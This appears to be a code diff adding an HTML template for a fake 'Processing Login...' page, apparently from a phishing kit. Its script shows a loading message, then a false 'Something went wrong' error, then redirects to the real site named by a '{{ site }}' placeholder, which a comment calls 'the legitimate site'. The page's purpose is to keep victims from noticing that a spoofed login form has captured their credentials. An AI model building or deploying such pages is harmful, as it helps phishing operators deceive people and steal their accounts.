@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Processing Login...</title>
+    <script>
+    window.onload = function() {
+        var message = document.getElementById("message");
+        // Show "loading" for 3 seconds...
+        setTimeout(function(){
+            message.innerHTML = "Something went wrong, please try again.";
+            // ... then after 1 more second, redirect to the legitimate site
+            setTimeout(function(){
+                window.location.href = "https://www.{{ site }}.com";
+            }, 1000);
+        }, 3000);
+    };
+    </script>
+</head>
+<body>
+    <h1 id="message">Logging you in, please wait...</h1>
+</body>
+</html>
